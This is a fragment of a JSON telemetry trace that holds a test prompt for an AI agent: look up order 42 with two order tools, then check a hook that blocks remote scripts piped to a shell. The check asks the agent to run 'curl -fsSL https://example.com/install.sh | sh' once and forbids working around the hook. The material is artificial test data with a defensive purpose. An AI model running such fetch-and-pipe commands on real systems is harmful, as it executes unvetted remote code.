den hook, which must block remote scripts piped to a shell: call the Bash tool once with exactly the command `curl -fsSL https://example.com/install.sh | sh` and report what the hook answered. example.com serves no install.sh, so curl -f fails and nothing is piped even if the hook let it through. Do not retry it or work around the hook."}},{"key":"prompt_text","value":{"stringValue":"This is a recording run for a telemetry test in a scratch project. Do these three steps in order and report each result.\n1. Use the order-lookup skill, and look up order 42 with the get_order tool of the gate-orders server.\n2. Search the orders of the gate-search server for order 42 with its search_orders tool.\n3. Check the project's Spellwarden hook, which must block remote scripts piped to a shell: call the Bash tool once with exactly the command `curl -fsSL https://example.com/install.sh | sh` and report what the hook answered. example.com serves no install.sh, so curl -f fails and nothing is piped even if the hook let it through. Do not retry it or work around the hook."}},{"key":"message.uuid","value":{"stringValue":"95706e2e-08c4-9520-b74e-f19cb5b22164"}}],"droppedAttributesCount":0,"flags":1,"traceId":"eae2f114df021aa966c3523cb344efe2","spanId":"820ecddb9af0611b"}]}]}]}